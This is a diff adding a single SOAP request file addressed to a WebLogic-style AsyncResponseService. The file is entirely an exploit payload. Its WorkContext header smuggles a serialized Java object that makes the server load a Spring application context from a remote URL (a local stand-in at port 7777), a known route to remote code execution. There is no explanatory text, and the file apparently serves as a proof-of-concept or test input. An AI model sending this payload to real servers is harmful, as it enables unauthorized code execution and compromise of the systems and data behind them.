@@ -1,0 +1,19 @@
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:wsa="http://www.w3.org/2005/08/addressing"
+                  xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+    <soapenv:Header>
+        <wsa:Action>xx</wsa:Action>
+        <wsa:RelatesTo>xx</wsa:RelatesTo>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+            <java>
+                <class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void>
+                    <string>http://127.0.0.1:7777/spel.xml</string>
+                </void>
+                </class>
+            </java>
+        </work:WorkContext>
+    </soapenv:Header>
+    <soapenv:Body>
+        <asy:onAsyncDelivery/>
+    </soapenv:Body>
+</soapenv:Envelope>
